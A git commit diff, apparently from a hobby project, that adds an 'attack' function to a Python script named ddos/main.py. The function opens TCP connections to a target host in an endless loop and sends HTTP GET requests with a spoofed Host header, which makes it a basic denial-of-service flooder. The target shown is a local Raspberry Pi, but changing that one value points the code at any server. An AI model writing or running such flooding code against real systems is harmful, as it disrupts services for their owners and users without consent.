e25c093bc5561e4a451dcbbfa5acb214dce8974e
TheChiefMeat <TheChiefMeat@gmail.com>
2020-08-09 14:53:28 +0100

    Added attack function

--- ddos/main.py
+++ ddos/main.py
@@ -3,3 +3,14 @@ import socket
 
 # Can also use IP address
 target = 'ddos.raspberrypi.local'
+port = 80
+# Offers no protection
+fake_ip = '82.23.20.32'
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
